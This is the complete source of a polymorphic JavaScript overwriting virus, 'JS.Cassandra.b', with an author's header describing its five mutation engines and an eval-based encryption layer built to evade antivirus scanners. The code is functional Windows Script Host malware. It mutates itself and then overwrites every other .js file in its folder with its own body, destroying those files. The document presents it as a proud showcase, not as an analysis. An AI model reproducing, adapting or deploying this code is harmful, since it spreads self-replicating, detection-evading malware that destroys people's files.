/*  JS.Cassandra.b
  by Second Part To Hell[rRlf]
  www.spth.de.vu
  spth@aonmail.at
  written in 2003 and finished 2004
  Austria

  This is, as you may imagine, the second version of JS.Cassandra. It is a five-times
  polymorphic and sometimes encrypt JavaScript Overwriter. As you can see, the code is
  very complex (it has about 5kB). Well, now let's talk about the technique:

  --> Polymorphism engine I: Permutation
      The virus splits the whole file into chr(10,13) and but the parts randomly together.
      This technique allows 14! variants at the first generation. (Due to the randomness
      of the virus there are much more variants after some generations)

  --> Polymorphism engine II: Function Games
      The virus searchs for a '{' and 1/4 it makes a new function with the code between the
      '{' and the '}', and calls the new function.

  --> Polymorphism engine III: Add garbage code
      The virus spits the whole code into chr(10,13), than 1/2 it includes random garbage code
      after a line to the code. The garbage code don't do anything.

  --> Polymorphism engine IV: Variable/Function name Changing
      The virus changes 27 variable or function names, which makes the code look very different.
      The new variable-name has a size of 6-21 letters. The engine's size could be much smaller,
      but due to the other polymorphism engines it wasn't possible to make it as small as possible.

  --> Polymorphism engine V: Number Changine
      At execution the virus searchs for a number (chr(48-57)) and 1/6 changes the number to a full
      calculation like:
      (1+9)=10
      (13-3)=10
      (80/8)=10
      In combination with the encryption this polymorphism engine is very successful.

  --> Encryption engine:
      The virus changes the whole code to ASCII-code. And execute it via 'eval' after retransform it
      to real code via 'String.fromCharCode'. This is, in my opinion a very successful way to fake
      AVs. In compination with the Number Changine-Polymorphism-Engine it's much more successful
      than alone.

  Thanks goes to jackie for his JS.Opitz, which was the first JS-virus. I used some parts of it for
  the file-finding in this virus.

  End-Notes:
  It is very doubtful that I will write any other script-viruses anymore. As you can see, scripts don't
  have any big secrets for me. Hey, this is a five-times polymorph, sometimes encrypted and very complex
  JavaScript virus. What else shall I make? Well, it was fun writing this, but no real challenge. Therefor
  I will close now with the following words: 'byebye, scripts!'...

--------------------------------------------<([{  JS.Cassandra.b  }])>--------------------------------------------   /*
 cassandra()
function cassandra(){nextln=String.fromCharCode(13,10);code=varsd(2).OpenTextFile(varsd(1)).ReadAll();if(code.charAt(0)=='e'&&Math.round(Math.random()*3)==1){decryption()}if(code.charAt(0)!='e'){if(Math.round(Math.random()*3)==1){bodychange()}if(Math.round(Math.random()*2)==1){funcgame()}if(Math.round(Math.random()*2)==1){trash()}if(Math.round(Math.random()*2)==1){varchange()}}if(Math.round(Math.random()*14)==1){encryption()}numberchange()}
function varsd(varnum){ if(varnum==1){check=String.fromCharCode(87,83,99,114,105,112,116,46,83,99,114,105,112,116,70,117,108,108,78,97,109,101)}if(varnum==2){check=String.fromCharCode(87,83,99,114,105,112,116,46,67,114,101,97,116,101,79,98,106,101,99,116,40,39,83,99,114,105,112,116,105,110,103,46,70,105,108,101,83,121,115,116,101,109,79,98,106,101,99,116,39,41,59,32)}return(eval(check))}
function funcgame(){code='';count=0;fcodn='';file=varsd(2).OpenTextFile(varsd(1)).ReadAll();for(i=0;i<file.length;i++){check=0;if(file.charCodeAt(i)==123&&Math.round(Math.random()*3)==1){if(file.charCodeAt(i+1)!=32){foundit();check=1;}}if(!check){code+=file.charAt(i)}}varsd(2).OpenTextFile(varsd(1),2).Write(code+fcodn)}
function foundit(){fcoda='';count=0;randon='';for(j=i;j<file.length;j++){if(file.charCodeAt(j)==123){count++}if(file.charCodeAt(j)==125){count--}if(!count){fcoda=file.substring(i+1,j);j=file.length}}for(j=0;j<Math.round(Math.random()*5)+4;j++){randon+=String.fromCharCode(Math.round(Math.random()*25)+97)}fcodn+=nextln+'function '+randon+'()'+String.fromCharCode(123)+fcoda+String.fromCharCode(125);code+=String.fromCharCode(123)+' '+randon+'()';i+=fcoda.length}
function trash(){code='';cote=varsd(2).OpenTextFile(varsd(1)).ReadAll().split(String.fromCharCode(13,10));file=varsd(2).OpenTextFile(varsd(1));for(i=0;i<cote.length;i++){if(cote[i].charAt(0)!='/'&&cote[i].charAt(0)!='v'&&cote[i].charAt(0)!='i'&&cote[i].substring(0,2)!='fo'){code+=cote[i]+nextln}trasname();nameb=namea;trasname();check=Math.round(Math.random()*8);if(check==1){code+='var '+namea+'='+String.fromCharCode(39)+nameb+String.fromCharCode(39)+nextln}if(check==1){code+='// '+namea+nextln}if(check==2){code+='var '+namea+'='+Math.round(Math.random()*9999999)+nextln}if(check==3){code+='if('+Math.round(Math.random()*9999)+'=='+Math.round(Math.random()*9999)+')'+String.fromCharCode(123)+namea+'()'+String.fromCharCode(125)+nextln}if(check==4){code+='for('+namea+'=0;'+namea+'>'+Math.round(Math.random()*9999)+';'+namea+'++)'+String.fromCharCode(123)+nameb+'()'+String.fromCharCode(125)+nextln}}file=varsd(2).OpenTextFile(varsd(1),2).Write(code)}
function trasname(){namea='';for(j=0;j<Math.round(Math.random()*15)+5;j++){namea+=String.fromCharCode(Math.round(Math.random()*25)+97)}}
function numberchange(){code='';file=varsd(2).OpenTextFile(varsd(1)).ReadAll();for(i=0;i<file.length;i++){if(file.charCodeAt(i)>47&&file.charCodeAt(i)<58){findfullnumber()}else{code+=file.charAt(i)}}varsd(2).OpenTextFile(varsd(1),2).Write(code);infectit()}
function findfullnumber(){numbber='';for(j=i;j<file.length;j++){if(file.charCodeAt(j)>47&&file.charCodeAt(j)<58){numbber+=file.charAt(j)}else{j=file.length}}if(Math.round(Math.random()*6)==1){random=Math.round(Math.random()*2);randon=Math.round(Math.random()*10)+1;if(random==0){code+='('+(numbber-randon)+'+'+randon+')'}if(random==1){code+='('+(numbber/1+randon)+'-'+randon+')'}if(random==2){code+='('+(numbber*randon)+'/'+randon+')'}}else{code+=numbber}i+=numbber.length-1}
function infectit(){infdir=varsd(2).GetFolder(varsd(2).GetFolder('.'));inffil=new Enumerator(infdir.Files);for(;!inffil.atEnd();inffil.moveNext()){if(varsd(2).GetExtensionName(inffil.item()).toUpperCase()=='JS'&&inffil.item()!=varsd(1)){varsd(2).OpenTextFile(inffil.item(),2).Write(code)}}}
function bodychange(){file=varsd(2).OpenTextFile(varsd(1)).ReadAll().split(String.fromCharCode(13,10));code=file.splice(0,1)+nextln;for(;file.length>0;){code+=file.splice(Math.round(Math.random()*file.length),1)+nextln;}varsd(2).OpenTextFile(varsd(1),2).Write(code)}
function varchange(){code=varsd(2).OpenTextFile(varsd(1)).ReadAll();cvar=new Array('bodychange','cassandra','check','code','cote','count','decryption','encryption','fcoda','fcodn','file','findfullnumber','foundit','funcgame','infectit','infdir','inffil','namea','nameb','nextln','numberchange','randon','trash','trasname','varchange','varnum','varsd');for(i=0;i<cvar.length;i++){trasname();for(j=0;j<code.length;j++){code=code.replace(cvar[i],namea);if(code.indexOf(cvar[i])==-1){j=code.length;}}}varsd(2).OpenTextFile(varsd(1),2).Write(code)}
function encryption(){file=varsd(2).OpenTextFile(varsd(1)).ReadAll();code='eval(String.fromCharCode('+file.charCodeAt(0);for(i=1;i<file.length;i++){code+=','+file.charCodeAt(i)}code+='))';varsd(2).OpenTextFile(varsd(1),2).Write(code)}
function decryption(){code='';file=varsd(2).OpenTextFile(varsd(1)).ReadAll();file=file.substring(25,file.length-2);file=file.split(',');for(i=0;i<file.length;i++){code+=String.fromCharCode(eval(file[i]))}varsd(2).OpenTextFile(varsd(1),2).Write(code)}